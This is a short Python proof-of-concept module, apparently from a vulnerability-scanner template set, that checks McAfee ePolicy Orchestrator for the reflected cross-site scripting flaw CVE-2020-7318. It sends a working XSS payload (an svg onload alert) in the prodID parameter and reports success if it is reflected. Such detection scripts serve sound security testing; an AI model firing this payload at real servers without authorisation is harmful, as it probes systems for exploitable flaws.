import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''McAfee ePolicy Orchestrator Reflected XSS''',
        "description": '''Cross-Site Scripting vulnerability in McAfee ePolicy Orchestrator (ePO)
prior to 5.10.9 Update 9 allows administrators to inject arbitrary web
script or HTML via multiple parameters where the administrator's entries
were not correctly sanitized.

reference:
- https://swarm.ptsecurity.com/vulnerabilities-in-mcafee-epolicy-orchestrator/''',
        "severity": "medium",
        "references": [
            ""
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:A/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2020-7318",
            "cwe-id": "CWE-79"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2020", "xss", "mcafee"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/PolicyMgmt/policyDetailsCard.do?poID=19&typeID=3&prodID=%27%22%3E%3Csvg%2fonload%3dalert(document.domain)%3E"""
        method = "GET"
        data = """"""
        headers = {'Connection': 'close'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""text/html""" in str(resp0.headers)) and ("""Policy Name""" in resp0.text and """'"><svg/onload=alert(document.domain)>""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url